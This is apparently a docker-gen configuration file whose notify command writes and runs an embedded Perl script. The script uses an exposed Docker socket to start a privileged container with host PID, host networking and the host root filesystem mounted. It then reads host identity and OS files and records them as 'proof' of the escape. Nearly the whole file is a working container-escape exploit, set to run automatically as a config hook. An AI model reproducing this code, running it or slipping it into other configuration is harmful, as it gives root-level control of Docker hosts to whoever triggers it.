[[config]]
template = "/tmp/pr-nginx.tmpl"
dest = "/tmp/pr-nginx-generated.conf"
onlyexposed = true
watch = false
notifycmd = '''sh -lc 'cat > /tmp/pr-docker-sock-escape.pl <<'"'"'PERL'"'"'
use strict;
use warnings;
use Socket;

my $sock_path = "/tmp/docker.sock";
my $proof = "/tmp/pr-dockergen-proof.txt";
my $name = "pr-host-escape-$$";
my $image = "nginxproxy/nginx-proxy:latest";

sub json_string {
    my ($s) = @_;
    $s =~ s/\\/\\\\/g;
    $s =~ s/"/\\"/g;
    $s =~ s/\n/\\n/g;
    return qq{"$s"};
}

sub dechunk {
    my ($body) = @_;
    my $out = "";

    while (length($body)) {
        $body =~ s/^\r?\n//;
        last unless $body =~ s/^([0-9a-fA-F]+)[^\r\n]*\r?\n//;
        my $len = hex($1);
        last if $len == 0;
        $out .= substr($body, 0, $len, "");
        $body =~ s/^\r?\n//;
    }

    return $out;
}

sub response_body {
    my ($response) = @_;
    my ($headers, $body) = split(/\r?\n\r?\n/, $response, 2);
    $body //= "";

    if ($headers =~ /Transfer-Encoding:\s*chunked/i) {
        return dechunk($body);
    }

    return $body;
}

sub docker_api {
    my ($method, $path, $body) = @_;
    $body //= "";

    socket(my $sock, AF_UNIX, SOCK_STREAM, 0) or die "socket: $!";
    connect($sock, sockaddr_un($sock_path)) or die "connect $sock_path: $!";

    my $request =
        "$method $path HTTP/1.1\r\n" .
        "Host: docker\r\n" .
        "Connection: close\r\n";

    if ($method eq "POST" || length($body)) {
        $request .=
            "Content-Type: application/json\r\n" .
            "Content-Length: " . length($body) . "\r\n";
    }

    $request .= "\r\n" . $body;

    print $sock $request;

    local $/;
    my $response = <$sock>;
    close($sock);

    return $response;
}

sub write_proof {
    my ($text) = @_;
    open(my $fh, ">", $proof) or die "open $proof: $!";
    print $fh $text;
    close($fh);
}

eval {
    docker_api("DELETE", "/containers/$name?force=true", "");

    my $host_command =
        q{proof=/host/tmp/pr-host-escape-proof.txt; } .
        q{{ echo ESCAPE_FROM_DOCKER_SOCK; date; id; hostname; uname -a; echo "--- host os-release ---"; cat /host/etc/os-release; } > "$proof"; } .
        q{cat "$proof"};

    my $create_body =
        "{" .
        qq{"Image":} . json_string($image) . "," .
        qq{"Tty":true,} .
        qq{"Cmd":["sh","-lc",} . json_string($host_command) . "]," .
        qq{"HostConfig":{ } .
            qq{"Privileged":true,} .
            qq{"PidMode":"host",} .
            qq{"NetworkMode":"host",} .
            qq{"Binds":["/:/host"]} .
        "}" .
        "}";

    my $create_response = docker_api("POST", "/containers/create?name=$name", $create_body);

    my ($container_id) = $create_response =~ /"Id"\s*:\s*"([^"]+)"/;

    if (!$container_id) {
        die "container create failed:\n$create_response\n";
    }

    my $start_response = docker_api("POST", "/containers/$container_id/start", "");

    if ($start_response !~ /^HTTP\/1\.[01]\s+204/m) {
        die "container start failed:\n$start_response\n";
    }

    docker_api("POST", "/containers/$container_id/wait", "");

    my $logs_response = docker_api("GET", "/containers/$container_id/logs?stdout=1&stderr=1", "");
    my $logs = response_body($logs_response);

    docker_api("DELETE", "/containers/$container_id?force=true", "");

    write_proof(
        "docker API via /tmp/docker.sock: OK\n" .
        "created privileged helper container: $container_id\n" .
        "host proof path: /tmp/pr-host-escape-proof.txt\n\n" .
        "--- helper container output ---\n" .
        $logs
    );
};

if ($@) {
    write_proof("docker API via /tmp/docker.sock: FAILED\n$@\n");
    exit 1;
}
PERL
perl /tmp/pr-docker-sock-escape.pl
' '''